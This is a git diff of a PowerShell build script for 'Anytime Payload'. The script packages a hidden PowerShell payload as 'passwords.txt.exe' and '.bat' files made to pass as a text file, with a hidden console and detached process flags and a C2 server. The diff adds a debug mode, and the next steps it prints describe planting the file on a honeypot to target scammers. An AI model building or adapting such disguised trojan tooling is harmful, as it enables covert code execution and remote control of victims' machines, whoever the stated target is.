@@ -1,14 +1,30 @@
 # Build Anytime Payload
 # Generates passwords.txt.bat and passwords.txt.exe
 # Usage: .\build.ps1 [bat|exe|both]
+#        .\build.ps1 -Dev (builds .exe with visible console for debugging)
 
-param([string]$Target = "both")
+param(
+    [string]$Target = "both",
+    [switch]$Dev
+)
 
-Write-Host ""
-Write-Host "======================================"
-Write-Host "  Anytime Payload Builder"
-Write-Host "======================================"
-Write-Host ""
+# Dev mode: only build .exe with visible console
+if ($Dev) {
+    $Target = "exe"
+    Write-Host ""
+    Write-Host "======================================"
+    Write-Host "  Anytime Payload Builder (DEV MODE)"
+    Write-Host "======================================"
+    Write-Host ""
+    Write-Host "Building with VISIBLE console for debugging..." -ForegroundColor Yellow
+    Write-Host ""
+} else {
+    Write-Host ""
+    Write-Host "======================================"
+    Write-Host "  Anytime Payload Builder"
+    Write-Host "======================================"
+    Write-Host ""
+}
 
 # ============================================
 # BUILD .BAT VERSION
@@ -102,6 +118,29 @@ if ($Target -eq "exe" -or $Target -eq "both") {
         exit 1
     }
     
+    # Create dev launcher if in dev mode
+    $launcherToUse = "launcher.py"
+    $devLauncherCreated = $false
+    
+    if ($Dev) {
+        Write-Host "  Creating dev launcher with visible windows..." -ForegroundColor Cyan
+        $launcherToUse = "launcher_dev.py"
+        $devLauncherCreated = $true
+        
+        # Read original launcher and modify it
+        $launcherContent = Get-Content "launcher.py" -Raw
+        
+        # Remove hidden window flags
+        $launcherContent = $launcherContent -replace '"-WindowStyle",\s*"Hidden",', ''
+        $launcherContent = $launcherContent -replace 'stdout=subprocess\.DEVNULL,', 'stdout=None,'
+        $launcherContent = $launcherContent -replace 'stderr=subprocess\.DEVNULL,', 'stderr=None,'
+        $launcherContent = $launcherContent -replace 'DETACHED_PROCESS = 0x00000008', '# DETACHED_PROCESS = 0x00000008  # Disabled for dev mode'
+        $launcherContent = $launcherContent -replace 'CREATE_NO_WINDOW = 0x08000000', '# CREATE_NO_WINDOW = 0x08000000  # Disabled for dev mode'
+        $launcherContent = $launcherContent -replace 'creation_flags = DETACHED_PROCESS \| CREATE_NO_WINDOW', 'creation_flags = 0  # Disabled for dev mode'
+        
+        [System.IO.File]::WriteAllText($launcherToUse, $launcherContent, [System.Text.Encoding]::UTF8)
+    }
+    
     # Find Python
     $python = "python"
     if (!(Get-Command python -ErrorAction SilentlyContinue)) {
@@ -126,15 +165,17 @@ if ($Target -eq "exe" -or $Target -eq "both") {
     # Determine separator (Windows uses ;, others use :)
     $sep = if ($IsWindows -or $env:OS -match "Windows") { ";" } else { ":" }
     
-    # Build with PyInstaller
+    # Build with PyInstaller (with or without console depending on dev mode)
+    $consoleFlag = if ($Dev) { "--console" } else { "--noconsole" }
+    
     & $python -m PyInstaller `
         --onefile `
-        --noconsole `
+        $consoleFlag `
         --icon=icon.ico `
         --name=passwords.txt `
         --add-data="payload.ps1$sep." `
         --clean `
-        launcher.py
+        $launcherToUse
     
     if ($LASTEXITCODE -ne 0) {
         Write-Host "ERROR: Build failed!" -ForegroundColor Red
@@ -146,6 +187,10 @@ if ($Target -eq "exe" -or $Target -eq "both") {
     # Clean up
     if (Test-Path "build") { Remove-Item "build" -Recurse -Force }
     if (Test-Path "__pycache__") { Remove-Item "__pycache__" -Recurse -Force }
+    if ($devLauncherCreated -and (Test-Path $launcherToUse)) { 
+        Remove-Item $launcherToUse -Force 
+        Write-Host "  -> Dev launcher cleaned" -ForegroundColor Gray
+    }
     Write-Host "  -> Build artifacts cleaned" -ForegroundColor Gray
 }
 
@@ -155,11 +200,23 @@ if ($Target -eq "exe" -or $Target -eq "both") {
 
 Write-Host ""
 Write-Host "======================================"
-Write-Host "  Build Complete!"
-Write-Host "======================================"
+if ($Dev) {
+    Write-Host "  Dev Build Complete!"
+    Write-Host "======================================"
+    Write-Host ""
+    Write-Host "Dev build created with VISIBLE console windows." -ForegroundColor Yellow
+    Write-Host "You'll see all PowerShell output when you run dist\passwords.txt.exe" -ForegroundColor Yellow
+} else {
+    Write-Host "  Build Complete!"
+    Write-Host "======================================"
+}
 Write-Host ""
 Write-Host "Next steps:"
 Write-Host "  1. Start C2 server: cd ..\sender && python sender.py"
-Write-Host "  2. Deploy payload to honeypot VM"
-Write-Host "  3. Wait for scammer to execute"
+if ($Dev) {
+    Write-Host "  2. Run dist\passwords.txt.exe to test (console will show debug output)"
+} else {
+    Write-Host "  2. Deploy payload to honeypot VM"
+    Write-Host "  3. Wait for scammer to execute"
+}
 Write-Host ""
